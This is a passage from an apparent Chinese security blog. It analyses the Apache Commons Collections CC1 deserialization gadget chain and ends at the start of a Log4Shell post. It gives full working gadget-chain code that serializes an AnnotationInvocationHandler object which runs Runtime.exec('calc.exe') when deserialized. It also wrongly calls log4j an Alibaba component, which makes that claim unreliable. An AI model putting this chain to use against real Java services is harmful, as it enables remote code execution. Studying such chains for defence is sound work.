class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;exec&quot;</span>;<br>        Class[] paramType = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName,paramType,args);<br>        transformer.transform(runtime);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC1</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC1</span>();<br>        a.testInvoker();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过向 <code>InvokerTransformer</code> 传入反射的 <code>Runtime</code> 类，可以看到，我们成功打开了我们电脑上的计算器。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917162854899.png" alt="image-20240917162854899"></p><p>这就说明了这个反序列的终点是可用的。</p><p>找到了终点，我们通过 idea 的功能去寻找看看有没有可控的参数调用这个终点函数 <code>tansform()</code> 方法</p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><blockquote><p>我们已经知道了 CC1 链条的结果，就不必再去复审可能的结果，直接看链条构成的函数 <code>TransformedMap.checkSetValue()</code> 方法</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917202806791.png" alt="image-20240917202806791"></p><p>接着查看 <code>checkSetValue()</code> 是谁再调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917203634663.png" alt="image-20240917203634663"></p><p>发现就这一个结果 <code>MapEntry</code> 的 <code>setValue()</code> 在调用，我们可以写段代码来验证这个 <code>SetValue()</code> 方法是否可以执行命令。</p><ul><li>当然我们在创建 <code>TransformedMap</code> 类时发现，它的构造方法是 <code>protected</code>，也就是不能直接 new()出这个对象</li></ul><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917204809217.png" alt="image-20240917204809217"></p><ul><li>我们在本类里查看，有没有方法调用了这个构造方法，可以借助其他方法帮我们完成实例化 <code>TransformedMap</code></li></ul><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917204956065.png" alt="image-20240917204956065"></p><p>看到 <code>decorate()</code> 这个 <code>public</code> 的方法调用了 <code>TransformedMap</code> 的构造方法</p><p>用下面这段代码，检验这个方法是否可以调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test02</span><span class="hljs-params">()</span>  &#123;<br>    System.out.println(<span class="hljs-string">&quot;正在运行&quot;</span>);<br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;exec&quot;</span>;<br>    Class[] paramType = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;;<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName,paramType,args);<br>    <span class="hljs-type">Transformer</span> <span class="hljs-variable">valueTrans</span> <span class="hljs-operator">=</span> transformer;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    map.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>    Map&lt;Object,Object&gt; transformed = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,valueTrans);<br>    <span class="hljs-keyword">for</span>(Map.Entry entry : transformed.entrySet()) &#123;<br>        entry.setValue(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，成功打开了计算机</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917210216161.png" alt="image-20240917210216161"></p><p>&#x3D;&#x3D;注意：这里之所以会去继续找上层的 <code>MapEntry</code> 的 <code>setValue()</code> 方法，是因为我们通过 <code>TransformedMap.decorate()</code> 方法获取的对象是 <code>Map</code> 类，而 <code>Map</code> 类是 <code>TransformedMap</code> 的父类，他不能调用子类的 <code>checkSetValue()</code> 方法，无法使链条闭环&#x3D;&#x3D;</p><h2 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h2><p><strong>AnnotationInvocationHandler</strong></p><p>在 JDK 的内置对象中 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中的 <code>readObject()</code> 方法调用了 <code>setValue()</code> 方法</p><p><code>readObject()</code> 就是反序列化自动执行的代码。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240918101922215.png" alt="image-20240918101922215"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这段代码在第 26 行调用了 <code>setValue()</code> 方法，但是我们仍然遇到了问题</p><ul><li>要满足 if 语句中 <code>memberType != null</code> 和 <code>!(memberType.isInstance(value) ||value instanceof ExceptionProxy)</code> 的判断，让代码可以自动执行到 <code>setValue()</code> 方法</li><li><code>setValue()</code> 方法的参数得换成 <code>RunTime</code> 对象</li></ul><p>尝试调试运行以下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;exec&quot;</span>;<br>        Class[] paramType = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName,paramType,args);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">valueTrans</span> <span class="hljs-operator">=</span> transformer;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        Map&lt;Object,Object&gt; transformed = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,valueTrans);<br>        <span class="hljs-comment">// for(Map.Entry entry : transformed.entrySet()) &#123;</span><br>        <span class="hljs-comment">//     entry.setValue(runtime);</span><br>        <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(SuppressWarnings.class,transformed);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(obj);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserializeCC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行完成&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC1</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC1</span>();<br>       <br>        a.test03();<br>        a.unserializeCC1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，我们的链条已经满足了 if 语句里的判断，进入了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>    memberValue.setValue(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>            annotationType.members().get(name)));<br>&#125;<br></code></pre></td></tr></table></figure><p>但是我们 <code>setValue()</code> 方法的参数是无效的参数</p><p><strong>这时候就巧妙地用到了 <code>constantTransformer.transform()</code> 方法</strong>，因为这个方法不管参数是什么，他最终都只会返回 <code>iConstant</code> 对象，我们把这个类里的 <code>iConstant</code> 赋值为 <code>Runtime</code> 对象，就可以使链条闭环</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240918122847125.png" alt="image-20240918122847125"></p><p>但是这样我们在传入参数的时候又遇到了一个问题</p><ul><li>就是我要传入两个有 <code>transform()</code> 方法的类 &#x3D;&#x3D;<code>constantTransformer</code> 和 <code>InvokerTransformer</code>&#x3D;&#x3D;</li></ul><p>这时候我们就看到了 <code>ChainedTransformer</code> 的 <code>transform()</code> 方法，他是在遍历对象的 <code>transform()</code> 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240918123654010.png" alt="image-20240918123654010"></p><p>这就允许我们的 CC1 链条完全闭环</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-comment">// ConstantTransformer返回Runtime</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constantTrans</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-comment">// 反射出Runtime</span><br>        Transformer[] transformed_arry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            constantTrans,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-comment">// ChainedTransformer循环调用transform()方法</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTrans</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformed_arry);<br><br>        <span class="hljs-comment">// 实例化传入ChainedTransformer对象</span><br>        Map&lt;Object,Object&gt; transformed = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTrans);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(SuppressWarnings.class,transformed);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(obj);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserializeCC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行完成&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC1</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC1</span>();<br>        a.CC1();<br>        a.unserializeCC1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我过程写的很简洁，因为我们在上帝视角来看这条链条，没有真正审计时候的迷茫和一些心理的煎熬。</p><p>而笔记的主要作用也是帮助我们可以串思路，能够想起这个链条的几个转折点够了</p><ul><li>MapEntry 的 setValue()方法，因为 <code>TransformedMap.decorate()</code> 方法获取的对象是 <code>Map</code> 类，而 <code>Map</code> 类是 <code>TransformedMap</code> 的父类，他不能调用子类的 <code>checkSetValue()</code> 方法</li><li>寻找起点时的 ChainedTransformer.transform() &#x3D;&#x3D;&gt; ConstantTransformer.transform() &#x3D;&#x3D; &gt; InvokerTransformer 的窍门利用</li><li>Runtime 类反射传入 InvokerTransformer，应为 Runtime 类不能被序列化</li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4Shell原理分析</title>
    <link href="/2025/04/02/log4Shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <url>/2025/04/02/log4Shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="log4Shell-漏洞"><a href="#log4Shell-漏洞" class="headerlink" title="log4Shell 漏洞"></a>log4Shell 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>log4j 是一款 alibaba 开源的用来记录日志的 java 组件，作者为了支持记录日志的多样性，使得 log4j 支持特殊的一种语法 <code>$&#123;&#125;</code> ， 用于待定内容，根据具体的变量名称在做填充。而 <code>$&#123;&#125;</code> 这种语法支持 JNDI 这种特殊的查询方式，这就给了攻击者执行命令的可能性。我们都知道 JNDI 全程 java Naming and Directory Interface 它是一种查询协议，支持 RMI 、ldap、JDBC、DNS 等协议的查询，也是爆出过很多攻击方式。<a href="https://www.cnblogs.com/LINGX5/p/18772225">详细可以看我这篇文章</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">&quot;WARN&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Appenders</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Console&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;SYSTEM_OUT&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;] [%level] - %msg%n&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Appenders</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Loggers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;Console&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Loggers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="log4jDemo"><a href="#log4jDemo" class="headerlink" title="log4jDemo"></a>log4jDemo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-comment">// 添加Log4j依赖类导入</span><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger; <span class="hljs-comment">// 添加Logger类导入</span><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager; <span class="hljs-comment">// 添加LogManager类导入</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4jDemo</span> &#123;<br>    <span class="hljs-comment">// 声明Logger实例</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(log4jDemo.class);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> 